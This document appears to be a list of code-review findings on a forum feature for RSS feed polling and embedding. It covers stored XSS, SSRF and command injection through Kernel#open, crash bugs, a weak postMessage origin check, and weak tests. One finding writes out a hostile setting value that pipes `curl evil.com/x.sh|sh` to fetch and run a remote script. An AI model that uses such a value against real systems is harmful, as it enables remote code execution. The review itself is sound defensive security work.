findings.title: Feed content is stored as pre-cooked HTML with no sanitization (stored XSS)
findings.body: `poll_feed` takes `i.content` straight from the remote RSS/Atom feed, runs `CGI.unescapeHTML` on it and hands it to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` (app/models/post.rb:133) then returns `raw` verbatim as `cooked`, completely bypassing PrettyText/the HTML sanitizer. The resulting HTML is rendered unescaped both in the Ember client (`{{{cooked}}}`) and in app/views/embed/best.html.erb (`raw post.cooked`). Any `<script>`, `onerror=`, `<iframe>` etc. present in the feed (compromised blog, feed that republishes user-submitted content, man-in-the-middle on a plain-HTTP feed URL) executes in the browsers of all forum users, including admins. The feed HTML should be run through the same sanitizer/whitelist that `import_remote` applies via Readability's tag/attribute whitelist before being stored as cooked output.

findings.title: `<%- end if %>` typo makes the header conditional depend on the logo link expression
findings.body: Line 6 reads `<%- end if %>` instead of `<%- end %>`. The generated template code becomes `end if` followed by the next emitted statement, which Ruby parses as a modifier-`if` whose condition is the *next* expression (the `link_to(image_tag(SiteSetting.logo_url ...))` on line 8). As a result the logo is evaluated/appended before the Discussion/Start-Discussion button, the ordering in the rendered header is reversed, and the whole if/else block is gated on the truthiness of a side-effecting buffer append. It is also one token away from an outright `SyntaxError` in this template (which would 500 the main embed action). Change it to `<%- end %>`.

findings.title: Re-import crashes when the embedded post has been deleted
findings.body: In the update branch, `post = embed.post` is used directly by `PostRevisor.new(post)`. `Post` includes `Trashable`, so a soft-deleted (or hard-deleted) post makes `embed.post` return `nil`, and `PostRevisor#revise!` then raises `NoMethodError` on `nil.raw`. Any topic/post that a moderator deletes will therefore make every subsequent feed poll or embed retrieval for that URL blow up (and, since `Jobs::PollFeed` has `retry: false` and no per-item rescue, abort the rest of the feed). Guard for a missing post and either skip or recreate the topic.

findings.title: Nil/absent feed item content aborts the whole poll
findings.body: `i.content.scrub` assumes every item exposes `content`. Plain RSS 2.0 feeds commonly only provide `description` (SimpleRSS returns `nil` for `content`/`content_encoded`), so this raises `NoMethodError` on `nil`. Because the loop has no per-item rescue and the job is declared `sidekiq_options retry: false`, a single such item silently aborts the import of the entire feed (and all later items). Fall back to `description`/`summary` and wrap each item so one bad entry does not kill the run.

findings.title: Kernel#open on a site-setting URL allows command execution and SSRF
findings.body: `open(SiteSetting.feed_polling_url)` uses `Kernel#open`, which executes a subprocess when the argument starts with `|` (e.g. `feed_polling_url = "|curl evil.com/x.sh|sh"`), and will happily read local files/internal addresses otherwise. Even though the setting is admin-only, a single compromised/misconfigured setting turns into remote code execution on the Sidekiq host. Use `URI.parse(url).open` (or an explicit HTTP client) and validate the scheme is http/https. The same concern applies to `open(url)` in `TopicEmbed.import_remote`.

findings.title: `import_remote` calls `open(url)` without requiring open-uri
findings.body: `import_remote` only does `require 'ruby-readability'`; it never requires `open-uri`. If nothing else in the process has loaded open-uri (e.g. `app/jobs/scheduled/poll_feed.rb`, which does require it, has not been autoloaded yet), `open(url)` falls back to `Kernel#open` as a file open and raises `Errno::ENOENT` for an http URL. This path is reached from `Jobs::RetrieveTopic` -> `TopicRetriever#fetch_http` and from the disqus thor task, so embed retrieval can fail non-deterministically depending on load order. Add `require 'open-uri'` (preferably `URI.parse(url).open`).

findings.title: New embed.css/embed.js assets are not added to the precompile list
findings.body: `stylesheet_link_tag 'embed'` references the newly added `app/assets/stylesheets/embed.css.scss`, and `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither file is reachable from `application.css`/`application.js` and the PR does not add them to `config.assets.precompile` in `config/application.rb`. With Sprockets in production (`assets.compile = false`) this raises an "asset is not present in the asset pipeline / not precompiled" error, so the embed page will 500 and the embed snippet will 404 after deploy.

findings.title: Two PollFeed guard tests pass vacuously
findings.body: "requires feed_polling_url" (line 18) and "requires embed_by_username" (line 24) only stub the one setting they are about; `feed_polling_enabled?` is left at its default, which is `false` in config/site_settings.yml. The first condition in `execute` therefore short-circuits and `poll_feed` would not be called even if the url/username guards were removed entirely, so these two examples assert nothing. Stub `feed_polling_enabled?` to true in both, and add coverage for `poll_feed` itself (item parsing, nil content, import call), which is currently untested.

findings.title: `import` mutates the caller's `contents` string
findings.body: `contents << "\n<hr>..."` appends the "Imported from" footer in place rather than building a new string. Callers that reuse or memoize the string (e.g. a `let(:contents)` in specs, or any retry loop) will get the footer appended repeatedly, and the computed `content_sha1` will differ run to run for identical input, causing spurious "content changed" revisions. A frozen string argument would raise `RuntimeError`. Use `contents = contents + "..."` / `contents.dup`.

findings.title: postMessage origin check uses substring matching
findings.body: `if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `e.origin` that is a substring of the configured `discourseUrl` (and also silently accepts `e.origin === ''`, since `indexOf('')` is 0). This is not an origin comparison; it should compare `e.origin` against the exact origin derived from `discourseUrl`. The current check weakens the only authentication on the resize messages and will also mis-handle a `discourseUrl` without a trailing slash (line 7 concatenates `"embed/best"` directly onto it, producing a wrong iframe src).

findings.title: SETNX followed by EXPIRE can leave a permanent throttle key
findings.body: `$redis.setnx(retrieved_key, "1")` and `$redis.expire(retrieved_key, 60)` are two round trips; if the process dies or the connection drops between them the key exists with no TTL and that embed URL is throttled forever, so the topic can never be retrieved. Use a single atomic `set(key, "1", ex: 60, nx: true)`.

findings.title: One Sidekiq job enqueued per request for an unknown embed_url
findings.body: Every request for an embed_url without a topic enqueues `Jobs::RetrieveTopic`; throttling happens only inside the job (`TopicRetriever#retrieved_recently?`). Since the endpoint is anonymous and unauthenticated (only a Referer check), a client hitting `embed/best` in a loop—or the loading page's unconditional 30s reload for many visitors—can flood the queue with jobs that all immediately no-op. Consider rate limiting the enqueue (e.g. check the same redis key before enqueueing).

findings.title: Already-committed migration changed to `create_table ... force: true`
findings.body: Editing an existing migration to add `force: true` means that on any database where `top_topics` exists but this migration version is not recorded (partially migrated/restored DB, schema loaded from schema.rb), running migrations will silently `DROP TABLE top_topics` and recreate it, losing data. Changing a released migration also makes checksum/history divergence between installs. If a reset is really needed, add a new migration instead.

findings.title: No coverage renders the new embed views
findings.body: The controller spec stubs `TopicView.new` (returning nil) and Rails controller specs do not render views unless `render_views` is enabled, so neither `embed/best.html.erb` nor `layouts/embed.html.erb` is ever exercised. That is why the `<%- end if %>` defect on best.html.erb:6 and the `@topic_view` usage are unverified. Add a `render_views` example with a real topic so template errors are caught.

findings.title: embed_url limited to 255 chars with a unique index
findings.body: `t.string :embed_url` defaults to varchar(255) in Postgres and is also the unique index column. Feed/article URLs regularly exceed 255 characters (tracking params, long slugs), which makes `TopicEmbed.create!` raise `PG::StringDataRightTruncation` inside the import transaction and permanently prevents embedding those pages. Use `:text` (with an index on the value or a hash) or document the limit and truncate/validate explicitly.
